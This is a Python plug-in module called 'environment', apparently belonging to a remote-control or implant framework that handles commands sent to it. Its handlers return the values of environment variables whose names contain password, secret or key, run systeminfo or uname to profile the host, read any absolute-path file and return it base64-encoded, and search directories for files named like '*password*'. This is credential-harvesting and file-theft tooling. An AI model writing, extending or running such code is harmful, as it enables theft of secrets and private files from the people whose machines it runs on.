"""环境变量模块 - environment"""

from modules.api import ModuleBase


class EnvironmentModule(ModuleBase):
    @property
    def name(self):
        return "environment"

    @property
    def description(self):
        return "环境变量模块 - 变量/配置/文件读取"

    @property
    def author(self):
        return "帅丘"

    @property
    def version(self):
        return "2.0.0"

    def handle(self, cmd):
        t = cmd.get("type")
        p = cmd.get("payload")

        if t == "env":
            action = p.get("action") if p else None
            if action == "list":
                return self._env_list(p)
            else:
                return {"status": "error", "result": f"Unknown action: {action}", "result_type": "error"}
        elif t == "config":
            return self._env_config(p)
        elif t == "readfile":
            return self._env_read(p)
        elif t == "search":
            return self._env_search(p)
        else:
            return {"status": "error", "result": f"Unknown command: {t}", "result_type": "error"}

    def get_commands(self):
        return ["env", "config", "readfile", "search"]

    def _env_list(self, payload):
        try:
            import os
            env_vars = {}
            for key, value in os.environ.items():
                if 'password' in key.lower() or 'secret' in key.lower() or 'key' in key.lower():
                    env_vars[key] = value
            
            result = "Sensitive Environment Variables:\n"
            for key, value in env_vars.items():
                result += f"  {key} = {value}\n"
            
            return {"status": "ok", "result": result, "result_type": "env_list"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _env_config(self, payload):
        try:
            import sys
            if sys.platform.startswith('win'):
                result = __import__('subprocess').run(['systeminfo'], capture_output=True, text=True, timeout=10)
                return {"status": "ok", "result": result.stdout[:2000], "result_type": "env_config"}
            else:
                result = __import__('subprocess').run(['uname', '-a'], capture_output=True, text=True, timeout=10)
                return {"status": "ok", "result": result.stdout + result.stderr, "result_type": "env_config"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _env_read(self, payload):
        try:
            file_path = payload.get("path") if payload else None
            if not file_path:
                return {"status": "error", "result": "Need path", "result_type": "error"}
            
            full_path = str(file_path)
            if not full_path.startswith('/') and not full_path.startswith('C:') and len(full_path) > 3:
                return {"status": "error", "result": "Only absolute paths", "result_type": "error"}
            
            import base64
            with open(full_path, 'rb') as f:
                data = f.read()
            return {"status": "ok", "result": base64.b64encode(data).decode(), "result_type": "file"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _env_search(self, payload):
        try:
            pattern = payload.get("pattern", "*password*") if payload else "*password*"
            target_dir = payload.get("path", ".") if payload else "."
            
            os_module = __import__('os')
            results = []
            for root, dirs, files in os_module.walk(str(target_dir)):
                for file in files:
                    if str(pattern).lower() in file.lower():
                        results.append(os_module.path.join(root, file))
            
            result_text = "Search Results:\n"
            for filepath in results[:50]:
                result_text += f"  {filepath}\n"
            
            return {"status": "ok", "result": result_text, "result_type": "env_search"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}


module = EnvironmentModule()
